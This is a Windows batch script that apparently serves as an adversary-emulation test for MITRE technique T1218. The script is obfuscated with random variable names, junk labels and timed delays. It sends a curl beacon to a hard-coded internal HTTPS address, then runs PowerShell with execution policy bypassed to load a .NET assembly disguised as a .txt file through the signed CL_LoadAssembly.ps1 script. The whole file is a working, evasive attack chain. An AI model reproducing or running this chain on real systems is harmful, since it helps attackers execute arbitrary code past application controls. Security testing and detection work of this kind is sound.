@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\7860\735fa017
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7860-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=taskmgr.txt
SET dvhhyc=7860

REM Random working variables
SET zxmqp=%mdvfmsbx%
SET mfdsjf=CL_LoadAssembly.ps1
SET klgjdf=curl
SET qwesd=powershell
SET plmnx=Audio
SET ytrewq=diagnostics
SET uiopz=system
SET asdfg=Windows
SET lkjhg=C:
SET poiuyt=C:\Windows\diagnostics\system\Audio
SET nbvcxz=1
SET mnbvc=0

REM Initial delay 30-60s
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: initial_delay_start=30s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
timeout /t 30 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: initial_delay_complete>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

REM Start state machine
SET state=0
GOTO dispatch_qwzxc

REM Dead code section (never reached)
:dead_akjdh
SET fake=never_executed
GOTO dead_vbnmc

:dead_vbnmc
EXIT /B

:dispatch_qwzxc
IF !state!==0 GOTO init_mnbvf
IF !state!==17 GOTO check_plkmj
IF !state!==42 GOTO prep_tyuio
IF !state!==83 GOTO exec_rtyui
IF !state!==99 GOTO END_ghjkl
GOTO END_ghjkl

REM Initialization state
:init_mnbvf
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: state_init=0>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
SET state=17
ping -n 12 127.0.0.1 >nul
GOTO dispatch_qwzxc

REM Junk code section
:junk_label1
REM This is dead code
SET junk=unused
GOTO junk_label2

:junk_label2
GOTO junk_label3

:junk_label3
EXIT /B

REM Heartbeat check state
:check_plkmj
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_start=!keghkgto!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
!klgjdf! -k -s -oNUL !keghkgto!
IF !ERRORLEVEL!==0 (
    SET hb_result=1
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_success>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
) ELSE (
    SET hb_result=0
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_failed>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
)

REM Random delay between operations
SET /A rdelay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_start=!rdelay!s>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_complete>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

SET state=42
GOTO dispatch_qwzxc

REM Junk code block
:junk_label4
REM More unused code
IF 0==0 (
    GOTO junk_label5
) ELSE (
    GOTO junk_label6
)

:junk_label5
:junk_label6

REM Preparation state
:prep_tyuio
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_start=!poiuyt!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
cd /d !poiuyt!
IF !ERRORLEVEL!==0 (
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_success>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_failed>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
)

CHOICE /C Y /D Y /T 8 >nul

SET state=83
GOTO dispatch_qwzxc

REM Execution state
:exec_rtyui
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: t1218_execution_start=!mfdsjf!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

SET exe_cmd=!qwesd!.exe -ep bypass -command "& {Set-Location '!poiuyt!'; Import-Module '.\\!mfdsjf!'; LoadAssemblyFromPath '!txisnba!\\!xzanpex!'; [Program]::Dale()}"

SET ttp_result=0
SET ttp_error=
!exe_cmd!
IF !ERRORLEVEL!==0 (
    SET ttp_result=1
    SET ttp_error=
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: t1218_execution_success>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
) ELSE (
    SET ttp_result=0
    SET ttp_error=assembly_load_failed
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: t1218_execution_failed>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
)

REM TTP logging
SET year=%DATE:~-4%
SET month=%DATE:~4,2%
SET day=%DATE:~7,2%
SET timefix=%TIME: =0%
SET hour=%timefix:~0,2%
SET minute=%timefix:~3,2%
SET second=%timefix:~6,2%
SET millis=000

ECHO [!year!-!month!-!day! !hour!:!minute!:!second!.!millis!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218^|Signed_Binary_Proxy_Execution=!ttp_result!:!ttp_error!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul || ver >nul

SET state=99
ping -n 5 127.0.0.1 >nul
GOTO dispatch_qwzxc

REM Final cleanup state
:END_ghjkl
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_completion>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
timeout /t 15 /nobreak >nul
EXIT /B